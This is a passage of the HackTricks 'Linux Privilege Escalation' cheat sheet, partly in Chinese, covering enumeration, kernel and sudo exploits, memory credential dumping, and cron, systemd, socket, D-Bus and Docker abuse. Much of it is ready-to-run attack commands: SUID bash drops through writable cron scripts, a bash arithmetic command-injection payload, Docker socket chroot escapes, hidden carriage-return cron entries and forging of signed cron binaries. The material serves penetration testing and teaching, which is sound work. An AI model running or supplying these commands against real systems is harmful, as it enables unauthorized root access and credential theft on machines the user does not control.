# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### 操作系统信息

让我们开始了解正在运行的操作系统。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

如果你 **对 `PATH` 变量中任意文件夹具有写权限**，你可能可以劫持某些 libraries 或 binaries：
```bash
echo $PATH
```
### 环境信息

环境变量中有有趣的信息、passwords 或 API keys 吗？
```bash
(env || set) 2>/dev/null
```
### 内核漏洞利用

检查内核版本并查看是否存在可以用来提权的漏洞利用。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个不错的存在漏洞的内核列表和一些已经 **compiled exploits**: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的站点: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网页提取所有受影响的内核版本，你可以这样做:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可帮助搜索 kernel exploits 的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (在 victim 上执行，仅检查针对 kernel 2.x 的 exploits)

始终 **在 Google 上搜索 kernel 版本**，也许你的 kernel 版本被写在某个 kernel exploit 中，这样你就能确定该 exploit 是有效的。

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于出现在以下位置的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用此 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

在 1.9.17p1 之前的 Sudo 版本（**1.9.14 - 1.9.17 < 1.9.17p1**）允许无特权本地用户在 `/etc/nsswitch.conf` 文件从用户控制的目录被使用时，通过 sudo `--chroot` 选项将权限提升为 root。

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

欲了解更多信息，请参阅原始的 [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB** 以获取如何利用此 vuln 的 **示例**
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 列出可能的防御

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在一个 docker container 内，你可以尝试从中逃逸：

{{#ref}}
docker-security/
{{#endref}}

## 驱动器

检查 **what is mounted and unmounted**，在哪里以及为什么。如果有任何 unmounted 的内容，你可以尝试将其 mount 并检查敏感信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

枚举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否已安装**任何编译器**。如果你需要使用某些 kernel exploit，这很有用，因为建议在将要使用它的机器上（或在一台类似的机器上）进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查已安装**软件包和服务的版本**。可能存在旧的 Nagios 版本（例如），可被利用来进行 escalating privileges…\
建议手动检查更可疑已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _请注意，这些命令会显示大量大多无用的信息，因此建议使用像 OpenVAS 或类似的应用来检查任何已安装的软件版本是否易受已知漏洞利用。_

## Processes

查看正在执行的 **哪些进程**，并检查是否有任何进程拥有 **超出其应有的权限**（比如某个 tomcat 正以 root 身份运行？）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.  
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.  
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.  
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: 所有进程都可以被调试，只要它们有相同的 uid。这是 ptrace 早期的传统行为。
> - **kernel.yama.ptrace_scope = 1**: 只有父进程可以被调试。
> - **kernel.yama.ptrace_scope = 2**: 只有 admin 能使用 ptrace，因为这需要 CAP_SYS_PTRACE 能力。
> - **kernel.yama.ptrace_scope = 3**: 不允许用 ptrace 跟踪任何进程。设置后需要重启才能再次启用 ptrace。

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示该进程的虚拟地址空间中内存如何映射**；它还显示 **每个映射区域的权限**。**mem** 伪文件**暴露了进程的内存本身**。从**maps**文件我们知道哪些**内存区域是可读的**以及它们的偏移。我们使用这些信息**定位到 mem 文件并将所有可读区域转储到文件**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以通过 /dev/kmem 访问。\\
通常，`/dev/mem` 只有 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump 是对来自 Sysinternals 工具套件中用于 Windows 的经典 ProcDump 工具的 Linux 重新实现。可在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要 dump 一个 process memory，你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除对 root 的要求并 dump 属于你的 process
- Script A.5 来自 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (需要 root)

### 从 Process Memory 获取 Credentials

#### 手动示例

如果你发现 authenticator process 正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump 该进程（参见前面的章节以找到用于 dump 进程内存的不同方法），并在内存中搜索凭据：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 会**从内存窃取明文凭证**并从一些**已知文件**中获取。它需要 root 权限才能正常工作。

| 功能                                           | 进程名               |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 搜索正则/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 定时/Cron 作业

### Crontab UI (alseambusher) 在 root 下运行 – 基于 web 的 scheduler privesc

如果 web “Crontab UI” 面板 (alseambusher/crontab-ui) 以 root 身份运行并且仅绑定到 loopback，你仍然可以通过 SSH 本地端口转发访问它，并创建一个有特权的作业来提升权限。

典型利用链
- 通过 `ss -ntlp` / `curl -v localhost:8000` 发现仅绑定到 loopback 的端口（例如 127.0.0.1:8000）和 Basic-Auth realm
- 在运维工件中查找凭据：
- 备份/脚本带有 `zip -P <password>`
- systemd unit 暴露了 `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- 建立隧道并登录:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个高权限任务并立即运行 (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它：
```bash
/tmp/rootshell -p   # root shell
```
加固
- 不要以 root 身份运行 Crontab UI；将其限制为专用用户并赋予最小权限
- 绑定到 localhost，并通过 firewall/VPN 进一步限制访问；不要重用 passwords
- 避免在 unit files 中嵌入 secrets；使用 secret stores 或 root-only EnvironmentFile
- 为 on-demand job executions 启用 audit/logging

检查是否有任何 scheduled job 存在漏洞。也许你可以利用由 root 执行的 script（wildcard vuln？能修改 root 使用的 files？使用 symlinks？在 root 使用的目录中创建特定文件？）
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 路径

例如，在 _/etc/crontab_ 中你可以找到 PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意 user 用户对 /home/user 有写权限_)

如果在这个 crontab 中 root 尝试执行某个命令或脚本而没有设置 PATH。例如： _\* \* \* \* root overwrite.sh_\
那么，你可以通过以下方式获得一个 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用带通配符的脚本 (Wildcard Injection)

如果由 root 执行的脚本在命令中包含 “**\***”，你可以利用这一点来触发意外行为（例如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果 wildcard 出现在类似** _**/some/path/\***_ **这样的路径前面，则不易受影响（甚至** _**./\***_ **也不易受影响）。**

阅读以下页面以获取更多 wildcard exploitation tricks：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 在 ((...)), $((...)) 和 let 的算术求值之前会执行 parameter expansion 和 command substitution。如果 root cron/parser 读取不受信任的日志字段并将它们传入算术上下文，攻击者可以注入一个 command substitution $(...)，当 cron 运行时该命令将在 root 身份下执行。

- 为什么会成功：在 Bash 中，expansions 的发生顺序为：parameter/variable expansion、command substitution、arithmetic expansion，然后是 word splitting 和 pathname expansion。因此像 `$(/bin/bash -c 'id > /tmp/pwn')0` 这样的值会先被替换（运行命令），然后剩下的数字 `0` 会用于算术运算，使脚本继续而不报错。

- 典型易受攻击的模式：
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 利用方法：将攻击者可控的文本写入被解析的日志，使看起来像数字的字段包含一个 command substitution 且以数字结尾。确保你的命令不向 stdout 打印（或将其重定向），这样算术运算才保持有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

如果你 **可以修改由 root 执行的 cron 脚本**，你可以很容易获得 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的脚本使用了一个你拥有完全访问权限的 **目录**，那么删除该文件夹并 **创建一个指向包含由你控制的脚本的另一个目录的符号链接目录** 可能会有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 自定义签名的 cron 二进制文件与可写载荷
蓝队有时会通过导出一个自定义 ELF 段并使用 grep 查找厂商字符串，在以 root 身份执行之前对由 cron 驱动的二进制文件进行“签名”。如果该二进制文件是 group-writable（例如，`/opt/AV/periodic-checks/monitor` 属于 `root:devs 770`）并且你可以 leak 签名材料，你就可以伪造该段并劫持该 cron 任务：

1. 使用 `pspy` 捕获验证流程。在 Era 中，root 运行了 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`，随后运行 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`，然后执行该文件。
2. 使用 leaked 的 key/config（来自 `signing.zip`）重建预期的证书：
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 构建一个恶意替换文件（例如，放置一个 SUID bash，添加你的 SSH key），并将证书嵌入 `.text_sig`，使 grep 校验通过：
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 覆盖计划任务的二进制文件，同时保留执行位：
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 等待下一次 cron 运行；一旦该简单的签名检查通过，你的 payload 就会以 root 身份运行。

### 频繁的 cron 任务

你可以监控进程以查找每隔 1、2 或 5 分钟执行的进程。也许你可以利用它进行提权。

例如，要 **在 1 分钟内每 0.1s 监控一次**、**按执行次数较少排序** 并删除那些被执行次数最多的命令，你可以这样做：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（它会监视并列出每个启动的进程）。

### 隐形 cron jobs

可以创建一个 cronjob，**在注释后放置回车字符**（不带换行字符），cron job 仍然会生效。示例（注意回车字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否可以写入任何 `.service` 文件，如果可以，您**可以修改它**，使其**执行**您的**backdoor** **当** 服务**启动**、**重启**或**停止**时（可能需要等待机器重启）。\
例如，在 `.service` 文件中创建您的 backdoor，使用 **`ExecStart=/tmp/script.sh`**

### 可写的服务二进制文件

请记住，如果您对由服务执行的二进制文件拥有**写入权限**，您可以将它们修改为 backdoors，这样当这些服务被重新执行时 backdoors 就会被执行。

### systemd PATH - 相对路径

您可以查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现你可以在路径的任意文件夹中**写入**，你可能能够**提升权限**。你需要搜索**在服务配置文件中使用相对路径**的情况，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，创建一个 **executable**，其名称为 **same name as the relative path binary**，放在你可写入的 systemd PATH 文件夹中；当该 service 被请求执行易受攻击的动作（**Start**, **Stop**, **Reload**）时，你的 **backdoor** 将被执行（非特权用户通常无法 start/stop services，但请检查你是否可以使用 `sudo -l`）。

**更多关于 services 的信息，请参阅 `man systemd.service`。**

## **Timers**

**Timers** 是以 `**.timer**` 结尾的 systemd unit 文件，用于控制 `**.service**` 文件或事件。**Timers** 可作为 cron 的替代方案，因为它们内建对日历时间事件和单调时间事件的支持，并且可以异步运行。

你可以使用以下命令枚举所有 timers：
```bash
systemctl list-timers --all
```
### 可写定时器

如果你可以修改一个定时器，你可以使它执行 systemd.unit 中已存在的某些单元（比如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
> 当该 timer 到期时要激活的 unit。参数是一个 unit 名称，其后缀不是 ".timer"。如果未指定，此值默认为与 timer unit 同名但后缀不同的 service。（见上文。）建议被激活的 unit 名称与 timer unit 的 unit 名称除后缀外保持一致。

因此，要滥用此权限，你需要：

- 找到某个 systemd unit（比如 `.service`）正在执行一个 **writable binary**
- 找到某个 systemd unit 正在执行一个 **relative path**，并且你对 **systemd PATH** 拥有 **writable privileges**（以冒充该可执行文件）

有关 timer 的更多信息，请参见 `man systemd.timer`。

### **启用 Timer**

要启用 timer，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
注意，可以通过在 `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` 上创建一个指向它的符号链接来激活 **timer**。

## Sockets

Unix Domain Sockets (UDS) 在客户端-服务器模型中实现了在同一台或不同机器上的**进程间通信**。它们使用标准的 Unix 描述符文件进行主机间通信，并通过 `.socket` 文件进行配置。

Sockets 可以通过 `.socket` 文件进行配置。

**使用 `man systemd.socket` 可以了解更多关于 sockets 的信息。** 在该文件中，可以配置若干有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项各不相同，但总的来说用于**指示将在哪监听**该 socket（AF_UNIX socket 文件的路径、要监听的 IPv4/6 地址和/或端口号等）。
- `Accept`: 接受一个布尔参数。如果 **true**，则为每个传入连接生成一个 **service 实例**，并且只有该连接的 socket 被传递给它。如果 **false**，所有监听 sockets 本身会被**传递给启动的 service 单元**，并且只为所有连接生成一个 service 单元。该值对 datagram sockets 和 FIFOs 被忽略，在它们中单个 service 单元无条件处理所有传入流量。**默认为 false**。出于性能原因，建议新的守护进程以适合 `Accept=no` 的方式编写。
- `ExecStartPre`, `ExecStartPost`: 接受一条或多条命令行，这些命令会在监听 **sockets**/FIFOs 被创建并绑定之前或之后**执行**。命令行的第一个 token 必须是绝对文件名，随后是该进程的参数。
- `ExecStopPre`, `ExecStopPost`: 在监听 **sockets**/FIFOs 被关闭并移除之前或之后执行的附加**命令**。
- `Service`: 指定在**传入流量**时要**激活**的 **service** 单元名称。此设置仅允许用于 Accept=no 的 sockets。它默认指向与 socket 同名的 service（后缀替换）。在大多数情况下，不需要使用此选项。

### Writable .socket files

如果你发现一个**可写的** `.socket` 文件，你可以在 `[Socket]` 段的开头添加类似 `ExecStartPre=/home/kali/sys/backdoor` 的内容，backdoor 将在 socket 被创建之前执行。因此，你**可能需要等待机器重启**。\
_注意：系统必须正在使用该 socket 文件的配置，否则 backdoor 不会被执行_

### Writable sockets

如果你**发现任何可写的 socket**（这里指的是 Unix Sockets，而不是配置文件 `.socket`），那么你**可以与该 socket 通信**，并可能利用其中的漏洞。

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

请注意，可能会有一些 **sockets listening for HTTP** 请求（_我不是指 .socket 文件，而是充当 unix sockets 的文件_）。你可以用以下命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果该 socket **responds with an HTTP** 请求，那么你可以与它 **communicate**，并可能 **exploit some vulnerability**。

### 可写 Docker Socket

Docker socket，通常位于 `/var/run/docker.sock`，是一个应当加固的关键文件。默认情况下，它对 `root` 用户和 `docker` 组的成员可写。对该 socket 拥有写权限可能导致 privilege escalation。下面是实现这一点的分解说明，以及在 Docker CLI 不可用时的替代方法。

#### **Privilege Escalation with Docker CLI**

如果你对 Docker socket 有写权限，你可以使用以下命令来 escalate privileges：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个容器，从而以 root 权限访问主机的文件系统。

#### **直接使用 Docker API**

在无法使用 Docker CLI 的情况下，仍然可以使用 Docker API 和 `curl` 命令来操作 Docker socket。

1.  **List Docker Images：** 检索可用的镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container：** 发送请求创建一个挂载主机根目录的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container：** 使用 `socat` 建立与容器的连接，从而可以在其中执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

在建立 `socat` 连接后，你可以在容器中直接执行命令，并以 root 权限访问主机的文件系统。

### 其他

注意，如果你对 docker socket 有写权限，因为你位于组 `docker`，你有 [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group)。如果 [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下位置查看更多利用 docker 逃逸或滥用以提升权限的方法：

{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 权限提升

如果你发现可以使用 **`ctr`** 命令，请阅读以下页面，因为 **你可能能够滥用它以提升权限**：

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 权限提升

如果你发现可以使用 **`runc`** 命令，请阅读以下页面，因为 **你可能能够滥用它以提升权限**：

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的进程间通信 (IPC) 系统，使应用程序能够高效交互和共享数据。为现代 Linux 系统设计，它为多种形式的应用间通信提供了强大的框架。

该系统功能多样，支持基本的进程间通信以增强进程间的数据交换，类似于 **enhanced UNIX domain sockets**。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自 Bluetooth daemon 的关于来电的信号可以促使音乐播放器静音，从而改善用户体验。D-Bus 还支持远程对象系统，简化应用之间的服务请求和方法调用，精简了传统上复杂的流程。

D-Bus 基于 **allow/deny model**，根据匹配策略规则的累积效果来管理消息权限（方法调用、信号发送等）。这些策略指定与总线的交互，可能通过滥用这些权限导致权限提升。

在 /etc/dbus-1/system.d/wpa_supplicant.conf 中给出了这样一条策略示例，详细说明了 root 用户对 `fi.w1.wpa_supplicant1` 拥有、发送和接收消息的权限。

未指定用户或组的策略适用于所有主体，而 "default" 上下文策略适用于未被其他特定策略覆盖的所有主体。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在这里了解如何枚举并利用 D-Bus 通信：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

对网络进行枚举并确定该机器的位置通常很有帮助。

### 通用枚举
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

始终检查在访问该主机前你无法与之交互的正在运行的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查是否可以 sniff 流量。如果可以，你可能能够获取一些凭证。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查你是哪个用户 (**who**)、你拥有哪些 **privileges**、系统中有哪些 **users**、哪些可以 **login**、以及哪些拥有 **root privileges**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
